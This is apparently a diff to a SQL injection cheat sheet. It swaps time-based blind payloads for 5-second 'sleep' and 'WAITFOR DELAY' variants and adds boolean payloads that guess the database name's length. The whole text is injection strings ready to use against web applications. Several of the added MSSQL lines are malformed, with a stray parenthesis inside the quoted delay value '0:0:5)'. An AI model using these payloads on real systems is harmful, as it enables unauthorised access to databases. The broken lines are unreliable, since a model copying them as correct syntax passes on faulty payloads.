@@ -1,10 +1,20 @@
 ### Time-based
 
 ```bash
-test' or sleep(10)-- - (Most databases)
-test;waitfor delay '0:0:10'-- -  (MSSQL)
-1');WAITFOR DELAY '0:0:10'-- -  (MSSQL)
-test';WAITFOR DELAY '0:0:10'-- -  (MSSQL)
-1;WAITFOR DELAY '0:0:10'-- -  (MSSQL)
+test' and sleep(5)-- - (Most databases)
+test' and sleep(5)# (Most databases)
+test;waitfor delay '0:0:5)'-- -  (MSSQL)
+1');WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
+test';WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
+1;WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
 ```
 
+### Boolean
+
+Determine character length of database:
+
+```bash
+1' and length(database())=1#
+1' and length(database())=2#
+1' and length(database())=3#
+```
